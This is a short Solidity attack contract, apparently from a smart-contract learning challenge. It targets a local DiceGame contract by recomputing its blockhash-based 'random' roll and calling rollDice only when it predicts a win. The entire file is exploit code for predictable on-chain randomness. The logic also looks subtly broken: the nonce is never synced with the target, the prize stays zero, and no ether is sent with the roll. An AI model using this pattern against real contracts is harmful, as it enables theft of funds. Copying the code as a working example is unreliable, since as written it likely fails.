// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/DiceGame.sol";

contract AttackDicegame {
    DiceGame public attackContract;
    uint256 public nonce = 0;
    uint256 public prize = 0;

    constructor(address payable _attackContract) payable {
        attackContract = DiceGame(_attackContract);
    }

    function rooleDicee() public {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
        uint256 roll = uint256(hash) % 16;

        if (roll > 2) {
            return;
        }
        uint256 amount = prize;
        (bool sent,) = msg.sender.call{value: amount}("");
        require(sent, "failed to send ether");

        attackContract.rollDice();
    }

    receive() external payable {}
}
